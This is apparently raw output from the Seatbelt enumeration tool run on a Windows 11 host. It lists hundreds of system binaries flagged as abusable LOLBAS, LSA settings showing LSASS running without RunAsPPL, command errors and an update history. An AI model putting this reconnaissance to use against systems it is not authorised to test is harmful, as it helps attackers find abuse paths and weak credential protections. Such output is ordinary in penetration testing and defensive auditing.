Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\f\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\r\msiexec.exe
Path: C:\Windows\System32\netsh.exe
Path: C:\Windows\SysWOW64\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.22621.1_none_c136c1f1eb970291\netsh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.22621.1_none_cb8b6c441ff7c48c\netsh.exe
Path: C:\Windows\System32\odbcconf.exe
Path: C:\Windows\SysWOW64\odbcconf.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.22621.1_none_6f0ca630e5db6641\odbcconf.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.22621.1_none_12ee0aad2d7df50b\odbcconf.exe
Path: C:\Windows\System32\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\f\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\r\pcalua.exe
Path: C:\Windows\System32\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\f\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\r\pcwrun.exe
Path: C:\Windows\System32\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\f\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\r\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.22621.3880_none_b3f4ed5def80e54c\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.22621.3880_none_be4997b023e1a747\Pester.bat
Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Windows\System32\PresentationHost.exe
Path: C:\Windows\SysWOW64\PresentationHost.exe
Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.22621.1_none_d189ff0513dc0e78\PresentationHost.exe
Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.22621.1_none_756b63815b7e9d42\PresentationHost.exe
Path: C:\Windows\System32\print.exe
Path: C:\Windows\SysWOW64\print.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_deb2b95b5b12c4ba\print.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_e90763ad8f7386b5\print.exe
Path: C:\Windows\System32\psr.exe
Path: C:\Windows\SysWOW64\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\f\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\r\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\f\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\r\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.22621.1_en-us_70432baa400e82bb\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.22621.1_en-us_7a97d5fc746f44b6\pubprn.vbs
Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\System32\rasautou.exe
Path: C:\Windows\SysWOW64\rasautou.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.22621.1_none_716fca6a59114fa2\rasautou.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.22621.1_none_7bc474bc8d72119d\rasautou.exe
Path: C:\Windows\System32\reg.exe
Path: C:\Windows\SysWOW64\reg.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.22621.1_none_9329ffb11e6da924\reg.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.22621.1_none_9d7eaa0352ce6b1f\reg.exe
Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15912.0_none_73fd08cefdd719a5\RegAsm.exe
Path: C:\Windows\WinSxS\wow64_regasm_b03f5f7f11d50a3a_4.0.15912.0_none_9dcb4fe8bf21aec2\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
Path: C:\Windows\regedit.exe
Path: C:\Windows\SysWOW64\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\f\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\r\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\f\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\r\regedit.exe
Path: C:\Windows\System32\regini.exe
Path: C:\Windows\SysWOW64\regini.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.22621.1_none_6dec0822ad8f13bd\regini.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.22621.1_none_7840b274e1efd5b8\regini.exe
Path: C:\Windows\System32\Register-CimProvider.exe
Path: C:\Windows\SysWOW64\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.22621.1_none_c4df69bddfb4410a\Register-CimProvider.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.22621.1_none_cf34141014150305\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15912.0_none_47183375504a1255\RegSvcs.exe
Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15912.0_none_8ec56a4c64c63b5b\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
Path: C:\Windows\System32\regsvr32.exe
Path: C:\Windows\SysWOW64\regsvr32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.22621.1_none_d9ece9052341c871\regsvr32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.22621.1_none_e441935757a28a6c\regsvr32.exe
Path: C:\Windows\System32\replace.exe
Path: C:\Windows\SysWOW64\replace.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_aa21baa549d827ab\replace.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_b47664f77e38e9a6\replace.exe
Path: C:\Windows\System32\RpcPing.exe
Path: C:\Windows\SysWOW64\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.22621.1_none_ff4fd9c43476b417\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.22621.1_none_09a4841668d77612\RpcPing.exe
Path: C:\Windows\System32\rundll32.exe
Path: C:\Windows\SysWOW64\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\f\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\r\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\f\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\r\rundll32.exe
Path: C:\Windows\System32\runonce.exe
Path: C:\Windows\SysWOW64\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\f\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\r\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\f\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\r\runonce.exe
Path: C:\Windows\System32\sc.exe
Path: C:\Windows\SysWOW64\sc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.22621.1_none_d60406ccc86ae2cf\sc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.22621.1_none_e058b11efccba4ca\sc.exe
Path: C:\Windows\System32\schtasks.exe
Path: C:\Windows\SysWOW64\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.22621.1_none_ebd54347a9148abf\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.22621.1_none_f629ed99dd754cba\schtasks.exe
Path: C:\Windows\System32\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\f\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\r\ScriptRunner.exe
Path: C:\Windows\System32\setupapi.dll
Path: C:\Windows\SysWOW64\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\r\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\f\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\r\setupapi.dll
Path: C:\Windows\System32\shdocvw.dll
Path: C:\Windows\SysWOW64\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\f\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\r\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\f\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\r\shdocvw.dll
Path: C:\Windows\System32\shell32.dll
Path: C:\Windows\SysWOW64\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\r\shell32.dll
Path: C:\Windows\System32\slmgr.vbs
Path: C:\Windows\SysWOW64\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.22621.1_none_a72f11d2b2de8e85\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.22621.1_none_b183bc24e73f5080\slmgr.vbs
Path: C:\Windows\System32\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\f\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\r\SyncAppvPublishingServer.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\SyncAppvPublishingServer.vbs
Path: C:\Windows\System32\syssetup.dll
Path: C:\Windows\SysWOW64\syssetup.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.22621.1_none_d26657818b74fb99\syssetup.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.22621.1_none_dcbb01d3bfd5bd94\syssetup.dll
Path: C:\Windows\System32\tttracer.exe
Path: C:\Windows\SysWOW64\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.22621.1_none_c5f9d5c001b0df5c\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.22621.1_none_d04e80123611a157\tttracer.exe
Path: C:\Windows\System32\url.dll
Path: C:\Windows\SysWOW64\url.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.22621.1_none_85b217d2bc626ea6\url.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.22621.1_none_29937c4f0404fd70\url.dll
Path: C:\Windows\WinSxS\amd64_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.22621.615_none_bb1e2ad901b29574\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.22621.615_none_f83cea0ab8654552\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_98d146a6029264ee\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.355_none_8ee5d84e72880b3f\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.22621.615_none_02cb61b0162ebe7a\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.22621.615_none_9c1e4e870007d41c\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_e07e7d7d170e8df4\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.355_none_d6930f2587043445\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
Path: C:\Windows\System32\verclsid.exe
Path: C:\Windows\SysWOW64\verclsid.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.22621.1_none_1d7c9cea07327c5f\verclsid.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.22621.1_none_27d1473c3b933e5a\verclsid.exe
Path: C:\Program Files\Windows Mail\wab.exe
Path: C:\Program Files (x86)\Windows Mail\wab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.22621.1_none_a43f2934cb50cea1\wab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.22621.1_none_ae93d386ffb1909c\wab.exe
Path: C:\Windows\System32\winrm.vbs
Path: C:\Windows\SysWOW64\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.22621.2506_none_aa3fdaf728a75456\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.22621.2506_none_b49485495d081651\winrm.vbs
Path: C:\Windows\System32\wbem\WMIC.exe
Path: C:\Windows\SysWOW64\wbem\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\f\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\r\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\f\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\r\WMIC.exe
Path: C:\Windows\System32\wscript.exe
Path: C:\Windows\SysWOW64\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\f\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\r\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\f\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\r\wscript.exe
Path: C:\Windows\System32\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\f\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\r\wsl.exe
Path: C:\Windows\System32\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\f\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\r\WSReset.exe
Path: C:\Windows\System32\xwizard.exe
Path: C:\Windows\SysWOW64\xwizard.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.22621.1_none_ba89dc872c421abf\xwizard.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.22621.1_none_c4de86d960a2dcba\xwizard.exe
Path: C:\Windows\System32\zipfldr.dll
Path: C:\Windows\SysWOW64\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\f\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\r\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\f\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\r\zipfldr.dll
Path: C:\Windows\System32\manage-bde.wsf
Found: 465 LOLBAS

To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Authentication Packages        : msv1_0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Notification Packages          : scecli
  Security Packages              : ""
  LsaPid                         : 748
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 4
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1
  RunAsPPL                       : 0
  IsPplAutoEnabled               : 1
  SCENoApplyLegacyAuditPolicy    : 0
  TurnOffAnonymousBlock          : 0
  LsaConfigFlags                 : 0
  RunAsPPLBoot                   : 0
====== MappedDrives ======

Mapped Drives (via WMI)

ERROR:   [!] Terminating exception running command 'MappedDrives': System.NullReferenceException: Object reference not set to an instance of an object.
   at Seatbelt.Commands.Windows.MappedDrivesCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== McAfeeConfigs ======

====== McAfeeSiteList ======

ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MicrosoftUpdates ======

Enumerating *all* Microsoft updates

  KB2267602  2/22/2026 3:01:54 AM    MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
  KB2267602  11/11/2024 6:50:21 PM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
  KB2267602  10/29/2024 7:56:03 AM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
  KB2267602  10/11/2024 2:26:30 AM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
             10/9/2024 10:20:17 PM   Acquisition;DevHome_UO 9N8MHTPHNGVV-Microsoft.Windows.DevHome
             10/9/2024 10:20:16 PM   Acquisition;DevHome_UO 9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
             10/9/2024 10:20:16 PM   Acquisition;DevHome_UO 9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NTXGKQ8P7N0-MicrosoftWindows.CrossDevice
             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
  KB5044285  10/9/2024 7:15:03 PM    MoUpdateOrchestrator 2024-10 Cumulative Update for Windows 11 Version 23H2 for x64-based Systems (KB5044285)
  KB4023057  10/9/2024 6:19:52 PM    MoUpdateOrchestrator 2023-11 Update for Windows 11 Version 23H2 for x64-based Systems (KB4023057)
  KB890830   10/9/2024 6:19:48 PM    MoUpdateOrchestrator Windows Malicious Software Removal Tool x64 - v5.129 (KB890830)
